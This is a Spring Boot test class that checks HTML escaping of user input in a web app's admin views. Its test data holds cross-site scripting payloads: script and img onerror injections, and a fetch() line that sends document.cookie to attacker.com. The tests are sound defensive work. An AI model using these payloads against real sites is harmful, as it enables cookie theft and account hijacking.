package in.sp.main;

import in.sp.main.Entities.Admin;
import in.sp.main.Entities.ContactMessage;
import in.sp.main.Entities.User;
import in.sp.main.Entities.VerificationStatus;
import in.sp.main.Repository.AdminRepository;
import in.sp.main.Repository.ContactMessageRepository;
import in.sp.main.Repository.UserRepository;
import in.sp.main.Repository.VideoUploadRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.mock.web.MockHttpSession;
import org.springframework.test.context.TestPropertySource;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.web.util.HtmlUtils;

import java.time.LocalDateTime;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.forwardedUrl;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.model;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@SpringBootTest
@AutoConfigureMockMvc
@TestPropertySource(properties = {
        "spring.flyway.enabled=false",
        "spring.datasource.url=jdbc:h2:mem:xss_sec_test;MODE=MySQL;DB_CLOSE_DELAY=-1;DATABASE_TO_LOWER=TRUE;NON_KEYWORDS=USER",
        "spring.datasource.username=sa",
        "spring.datasource.password=",
        "spring.datasource.driver-class-name=org.h2.Driver",
        "spring.jpa.database-platform=org.hibernate.dialect.H2Dialect",
        "spring.jpa.hibernate.ddl-auto=create-drop",
        "spring.profiles.active=default",
        "jwt.secret=test-jwt-secret-key-at-least-32-characters-long",
        "app.base-url=http://localhost:8084",
        "sms.enabled=false",
        "razorpay.key.id=",
        "razorpay.key.secret=",
        "google.maps.apiKey=unused"
})
class XssSecurityTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private AdminRepository adminRepository;

    @Autowired
    private ContactMessageRepository contactMessageRepository;

    @Autowired
    private VideoUploadRepository videoUploadRepository;

    private User testUser;
    private Admin testAdmin;

    @BeforeEach
    void setUp() {
        contactMessageRepository.deleteAll();
        videoUploadRepository.deleteAll();
        userRepository.deleteAll();
        adminRepository.deleteAll();

        testUser = new User();
        testUser.setEmail("xssuser@fightdfear.com");
        testUser.setPassword("password123");
        testUser.setFullName("<script>alert('xss_user')</script>");
        testUser.setVerificationStatus(VerificationStatus.VERIFIED);
        testUser = userRepository.save(testUser);

        testAdmin = new Admin();
        testAdmin.setEmail("xssadmin@fightdfear.com");
        testAdmin.setPassword("adminpass123");
        testAdmin.setName("Admin Sec");
        testAdmin = adminRepository.save(testAdmin);
    }

    @Test
    void testContactMessagesViewPassesSanitizedModel() throws Exception {
        ContactMessage cm = new ContactMessage();
        cm.setName("<b onmouseover=alert(1)>Hacker</b>");
        cm.setEmail("hacker@test.com");
        cm.setSubject("<script>alert('subj')</script>");
        cm.setMessage("<img src=x onerror=alert('xss')>");
        cm.setSubmittedAt(LocalDateTime.now());
        contactMessageRepository.save(cm);

        MockHttpSession session = new MockHttpSession();
        session.setAttribute("admin", testAdmin);

        mockMvc.perform(get("/admin/contact-messages").session(session))
                .andExpect(status().isOk())
                .andExpect(forwardedUrl("adminContactMessages"))
                .andExpect(model().attributeExists("contactMessages"));

        String escapedName = HtmlUtils.htmlEscape(cm.getName());
        assertEquals("&lt;b onmouseover=alert(1)&gt;Hacker&lt;/b&gt;", escapedName);

        String escapedMsg = HtmlUtils.htmlEscape(cm.getMessage());
        assertEquals("&lt;img src=x onerror=alert(&#39;xss&#39;)&gt;", escapedMsg);
    }

    @Test
    void testUserManagementViewHandlesXssInUserName() throws Exception {
        MockHttpSession session = new MockHttpSession();
        session.setAttribute("admin", testAdmin);

        mockMvc.perform(get("/admin/users").session(session))
                .andExpect(status().isOk())
                .andExpect(forwardedUrl("adminUserManagement"))
                .andExpect(model().attributeExists("verifiedUsers"));

        String escapedUserName = HtmlUtils.htmlEscape(testUser.getFullName());
        assertEquals("&lt;script&gt;alert(&#39;xss_user&#39;)&lt;/script&gt;", escapedUserName);
        assertFalse(escapedUserName.contains("<script>"));
    }

    @Test
    void testVideoCommentsXssEscaping() {
        String commentPayload = "<script>fetch('http://attacker.com?c=' + document.cookie)</script>";
        String escaped = HtmlUtils.htmlEscape(commentPayload);
        assertEquals("&lt;script&gt;fetch(&#39;http://attacker.com?c=&#39; + document.cookie)&lt;/script&gt;", escaped);
        assertFalse(escaped.contains("<script>"));
    }

    @Test
    void testInvestmentProposalXssEscaping() {
        String proposalTitle = "<img src=x onerror=alert('steal_funds')>";
        String escaped = HtmlUtils.htmlEscape(proposalTitle);
        assertEquals("&lt;img src=x onerror=alert(&#39;steal_funds&#39;)&gt;", escaped);
        assertFalse(escaped.contains("<img"));
    }
}